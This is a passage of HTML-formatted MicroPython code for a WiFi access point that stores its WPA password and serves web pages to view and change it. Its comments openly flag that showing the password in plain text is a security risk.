class="c1">(PASSWORD_FILE, </span><span class="c5">&#39;w&#39;</span><span class="c1">) </span><span class="c3">as</span><span class="c0">&nbsp;f:</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; f.write(password)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; f.flush() </span><span class="c9"># Ensure data is written to internal buffer</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; uos.sync() </span><span class="c9"># Attempt to synchronize filesystem to ensure data is on flash</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot;Password saved and synced to &#39;</span><span class="c15">{PASSWORD_FILE}</span><span class="c5">&#39;.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">return</span><span class="c1">&nbsp;</span><span class="c6">True</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">except</span><span class="c1">&nbsp;Exception </span><span class="c3">as</span><span class="c0">&nbsp;e:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot;Error saving password to file: </span><span class="c15">{e}</span><span class="c5">&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">return</span><span class="c1">&nbsp;</span><span class="c6">False</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c3">def</span><span class="c1">&nbsp;</span><span class="c12">setup_access_point</span><span class="c0">(password):</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c5">&quot;&quot;&quot;Configures the Access Point (AP) WiFi.&quot;&quot;&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">global</span><span class="c0">&nbsp;current_ap_password</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; current_ap_password = password </span><span class="c9"># Update global password variable</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; print(</span><span class="c5">&quot;Attempting to setup AP...&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># Attempt to activate and configure AP, retry a few times</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">for</span><span class="c1">&nbsp;i </span><span class="c3">in</span><span class="c1">&nbsp;</span><span class="c10">range</span><span class="c1">(</span><span class="c6">3</span><span class="c0">):</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot; &nbsp;Attempt </span><span class="c15">{i+</span><span class="c6">1</span><span class="c15">}</span><span class="c5">/3...&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot; &nbsp; &nbsp;Deactivating AP...&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ap.active(</span><span class="c6">False</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot; &nbsp; &nbsp;AP deactivated.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; time.sleep(</span><span class="c6">1</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot; &nbsp; &nbsp;Activating AP...&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ap.active(</span><span class="c6">True</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot; &nbsp; &nbsp;AP activated.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot; &nbsp; &nbsp;Configuring SSID and password...&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ap.config(essid=AP_SSID, authmode=network.AUTH_WPA2_PSK, password=current_ap_password)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot; &nbsp; &nbsp;SSID and password configured.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot; &nbsp; &nbsp;Configuring IP...&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ap.ifconfig((AP_IP, AP_SUBNET, AP_GATEWAY, AP_DNS))</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot; &nbsp; &nbsp;IP configured.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Wait for AP to be active (este bucle de espera ocurre DESPUES de todo lo anterior)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot; &nbsp; &nbsp;Waiting for AP to be active...&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; timeout = </span><span class="c6">10</span><span class="c1">&nbsp;</span><span class="c9"># seconds</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; start_time = time.time()</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">while</span><span class="c1">&nbsp;</span><span class="c3">not</span><span class="c1">&nbsp;ap.active() </span><span class="c3">and</span><span class="c0">&nbsp;(time.time() - start_time) &lt; timeout:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; time.sleep(</span><span class="c6">0.5</span><span class="c0">)</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">if</span><span class="c0">&nbsp;ap.active():</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot; &nbsp; &nbsp;AP reports active.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot;\nAccess Point created/updated:&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot; &nbsp;SSID = </span><span class="c15">{AP_SSID}</span><span class="c5">&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot; &nbsp;AP IP Address: </span><span class="c15">{AP_IP}</span><span class="c5">&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot; &nbsp;Current WPA Password: </span><span class="c15">{current_ap_password}</span><span class="c5">&quot;</span><span class="c1">) </span><span class="c9"># Display current password</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">return</span><span class="c1">&nbsp;</span><span class="c6">True</span><span class="c1">&nbsp;</span><span class="c9"># Success</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">else</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot; &nbsp; &nbsp;AP failed to activate after </span><span class="c15">{timeout}</span><span class="c5">s timeout.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Try again...</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">except</span><span class="c1">&nbsp;Exception </span><span class="c3">as</span><span class="c0">&nbsp;e:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot; &nbsp; &nbsp;Error during AP setup attempt </span><span class="c15">{i+</span><span class="c6">1</span><span class="c15">}</span><span class="c5">: </span><span class="c15">{e}</span><span class="c5">&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; time.sleep(</span><span class="c6">2</span><span class="c1">) </span><span class="c9"># Wait before retrying</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># Si el bucle for(3 intentos) termina sin &eacute;xito</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; print(</span><span class="c5">&quot;Failed to setup Access Point after multiple attempts. Exiting.&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; sys.exit() </span><span class="c9"># Exit the script if AP setup fails critically</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c3">def</span><span class="c1">&nbsp;</span><span class="c12">config_webpage_html</span><span class="c1">(message=</span><span class="c5">&quot;&quot;</span><span class="c0">):</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c5">&quot;&quot;&quot;Generates the HTML for the config page with the form.&quot;&quot;&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># </span><span class="c3">NOTE:</span><span class="c9">&nbsp;The current password is shown in plain text below.</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># The input field for the NEW password uses type=&quot;password&quot; to hide typing.</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># Changing input type to &quot;text&quot; would show the password while typing (less secure).</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; html = </span><span class="c7 c5">f&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></p><p class="c2"><span class="c7 c5">&lt;html&gt;</span></p><p class="c2"><span class="c7 c5">&lt;head&gt;</span></p><p class="c2"><span class="c5">&nbsp; &nbsp; &lt;title&gt;Configure </span><span class="c15">{AP_SSID}</span><span class="c7 c5">&lt;/title&gt;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &lt;style&gt;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; body {{ font-family: Arial, sans-serif; margin: 40px; background-color: #f0f0f0; text-align: center; }}</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; .container {{ max-width: 500px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; h2 {{ color: #333; }}</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; label {{ display: block; margin-bottom: 5px; font-weight: bold; text-align: left; }}</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; input[type=&quot;password&quot;], input[type=&quot;text&quot;] {{ width: calc(100% - 22px); padding: 10px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 4px; }}</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; input[type=&quot;submit&quot;] {{ background-color: #003399; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }}</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; input[type=&quot;submit&quot;]:hover {{ background-color: #002277; }}</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; .message {{ color: green; margin-top: 20px; font-weight: bold; }}</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; .error {{ color: red; margin-top: 20px; font-weight: bold; }}</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* WARNING: Displaying password in plain text is a security risk */</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; .plain-password {{ font-weight: bold; color: #003399; }}</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &lt;/style&gt;</span></p><p class="c2"><span class="c7 c5">&lt;/head&gt;</span></p><p class="c2"><span class="c7 c5">&lt;body&gt;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &lt;div class=&quot;container&quot;&gt;</span></p><p class="c2"><span class="c5">&nbsp; &nbsp; &nbsp; &nbsp; &lt;h2&gt;Configure WPA Password for </span><span class="c15">{AP_SSID}</span><span class="c7 c5">&lt;/h2&gt;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &lt;!-- Current AP Password is displayed in plain text here --&gt;</span></p><p class="c2"><span class="c5">&nbsp; &nbsp; &nbsp; &nbsp; &lt;p&gt;Current AP Password: &lt;strong class=&quot;plain-password&quot;&gt;</span><span class="c15">{current_ap_password}</span><span class="c7 c5">&lt;/strong&gt;&lt;/p&gt;</span></p><p class="c2 c8"><span class="c7 c5"></span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &lt;form action=&quot;/update_password&quot; method=&quot;post&quot;&gt;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;label for=&quot;new_password&quot;&gt;New Password (minimum 8 characters):&lt;/label&gt;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;!-- Input field uses type=&quot;password&quot; to hide typing --&gt;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;input type=&quot;password&quot; id=&quot;new_password&quot; name=&quot;new_password&quot; minlength=&quot;8&quot; required&gt;</span></p><p class="c2 c8"><span class="c7 c5"></span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;input type=&quot;submit&quot; value=&quot;Update Password&quot;&gt;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &lt;/form&gt;</span></p><p class="c2"><span class="c5">&nbsp; &nbsp; &nbsp; &nbsp; &quot;&quot;&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">if</span><span class="c0">&nbsp;message:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; message_class = </span><span class="c5">&quot;message&quot;</span><span class="c1">&nbsp;</span><span class="c3">if</span><span class="c1">&nbsp;</span><span class="c5">&quot;success&quot;</span><span class="c1">&nbsp;</span><span class="c3">in</span><span class="c1">&nbsp;message </span><span class="c3">or</span><span class="c1">&nbsp;</span><span class="c5">&quot;updated&quot;</span><span class="c1">&nbsp;</span><span class="c3">in</span><span class="c1">&nbsp;message </span><span class="c3">else</span><span class="c1">&nbsp;</span><span class="c5">&quot;error&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; html += </span><span class="c5">f&#39;&lt;p class=&quot;</span><span class="c15">{message_class}</span><span class="c5">&quot;&gt;</span><span class="c15">{message}</span><span class="c5">&lt;/p&gt;&#39;</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; html += </span><span class="c7 c5">&quot;&quot;&quot;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &lt;/div&gt;</span></p><p class="c2"><span class="c7 c5">&lt;/body&gt;</span></p><p class="c2"><span class="c7 c5">&lt;/html&gt;</span></p><p class="c2"><span class="c5">&quot;&quot;&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">return</span><span class="c0">&nbsp;html</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c3">def</span><span class="c1">&nbsp;</span><span class="c12">restarting_webpage_html</span><span class="c1">(new_password, seconds=</span><span class="c6">7</span><span class="c0">):</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c5">&quot;&quot;&quot;Generates the HTML for the restarting page with a countdown, displays new password.&quot;&quot;&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># WARNING: Displaying the new password here is a security risk.</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; html = </span><span class="c7 c5">f&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></p><p class="c2"><span class="c7 c5">&lt;html&gt;</span></p><p class="c2"><span class="c7 c5">&lt;head&gt;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &lt;title&gt;Restarting...&lt;/title&gt;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &lt;style&gt;</span></p><p class="c2"><span class="c5 c7">&nbsp; &nbsp; &nbsp; &nbsp; body {{ font-family: Arial, sans-serif; margin: 40px; background-color: #f0f0f0; text-align: center; }}</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; .container {{ max-width: 500px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; h2 {{ color: #333; }}</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; .message {{ color: green; margin-top: 20px; font-weight: bold; }}</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; #countdown {{ font-size: 1.5em; font-weight: bold; color: #003399; }}</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* WARNING: Displaying password in plain text is a security risk */</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; .plain-password {{ font-weight: bold; color: #003399; }}</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &lt;/style&gt;</span></p><p class="c2"><span class="c7 c5">&lt;/head&gt;</span></p><p class="c2"><span class="c7 c5">&lt;body&gt;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &lt;div class=&quot;container&quot;&gt;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &lt;h2&gt;Password Updated!&lt;/h2&gt;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &lt;p class=&quot;message&quot;&gt;The new password has been saved.&lt;/p&gt;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &lt;!-- New Password is displayed in plain text here --&gt;</span></p><p class="c2"><span class="c5">&nbsp; &nbsp; &nbsp; &nbsp; &lt;p&gt;New Password: &lt;strong class=&quot;plain-password&quot;&gt;</span><span class="c15">{new_password}</span><span class="c7 c5">&lt;/strong&gt;&lt;/p&gt;</span></p><p class="c2"><span class="c5">&nbsp; &nbsp; &nbsp; &nbsp; &lt;p&gt;The device is restarting with the new password in &lt;span id=&quot;countdown&quot;&gt;</span><span class="c15">{seconds}</span><span class="c7 c5">&lt;/span&gt; seconds.&lt;/p&gt;</span></p><p class="c2"><span class="c5">&nbsp; &nbsp; &nbsp; &nbsp; &lt;p&gt;Please reconnect to the &quot;</span><span class="c15">{AP_SSID}</span><span class="c7 c5">&quot; network using the new password shortly.&lt;/p&gt;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &lt;/div&gt;</span></p><p class="c2 c8"><span class="c7 c5"></span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &lt;script&gt;</span></p><p class="c2"><span class="c5">&nbsp; &nbsp; &nbsp; &nbsp; var count = </span><span class="c15">{seconds}</span><span class="c7 c5">;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; var countdownElement = document.getElementById(&#39;countdown&#39;);</span></p><p class="c2 c8"><span class="c7 c5"></span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; function updateCountdown() {{</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; count--;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; countdownElement.textContent = count;</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (count &lt;= 0) {{</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Countdown finished. The device is expected to reset.</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // No need to do anything client-side.</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }} else {{</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; setTimeout(updateCountdown, 1000);</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }}</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; }}</span></p><p class="c2 c8"><span class="c7 c5"></span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; // Start the countdown immediately</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &nbsp; &nbsp; updateCountdown();</span></p><p class="c2"><span class="c7 c5">&nbsp; &nbsp; &lt;/script&gt;</span></p><p class="c2"><span class="c7 c5">&lt;/body&gt;</span></p><p class="c2"><span class="c7 c5">&lt;/html&gt;</span></p><p class="c2"><span class="c5">&quot;&quot;&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">return</span><span class="c0">&nbsp;html</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c3">def</span><span class="c1">&nbsp;</span><span class="c12">handle_request</span><span class="c0">(client_socket):</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c5">&quot;&quot;&quot;Handles an individual client connection.&quot;&quot;&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># Using a smaller buffer for reading might help with memory</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Read the request line by line to find the body and headers</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; request_bytes = </span><span class="c5">b&quot;&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Set a reasonable timeout for receiving data</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; client_socket.settimeout(</span><span class="c6">5</span><span class="c1">) </span><span class="c9"># Timeout after 5 seconds of inactivity</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">while</span><span class="c1">&nbsp;</span><span class="c6">True</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; chunk = client_socket.recv(</span><span class="c6">128</span><span class="c1">) </span><span class="c9"># Read in chunks (reduced from 1024/64)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">if</span><span class="c1">&nbsp;</span><span class="c3">not</span><span class="c1">&nbsp;chunk: </span><span class="c9"># Connection closed by client</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># print(&quot;Client closed connection prematurely.&quot;) # Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">return</span><span class="c1">&nbsp;</span><span class="c9"># Client closed the connection</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; request_bytes += chunk</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">if</span><span class="c1">&nbsp;</span><span class="c5">b&#39;\r\n\r\n&#39;</span><span class="c1">&nbsp;</span><span class="c3">in</span><span class="c0">&nbsp;request_bytes:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">break</span><span class="c1">&nbsp;</span><span class="c9"># Found end of headers</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">if</span><span class="c1">&nbsp;</span><span class="c10">len</span><span class="c1">(request_bytes) &gt; </span><span class="c6">2048</span><span class="c1">: </span><span class="c9"># Prevent excessive memory use for large requests</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;print(</span><span class="c5">&quot;Request too large, closing connection.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c9"># Optionally send 413 Payload Too Large response</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;client_socket.send(</span><span class="c5">&quot;HTTP/1.1 413 Payload Too Large\r\nConnection: close\r\n\r\n&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">except</span><span class="c0">&nbsp;OSError:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">pass</span><span class="c1">&nbsp;</span><span class="c9"># Ignore if socket already closed</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">return</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">except</span><span class="c0">&nbsp;socket.timeout:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;print(</span><span class="c5">&quot;Socket receive 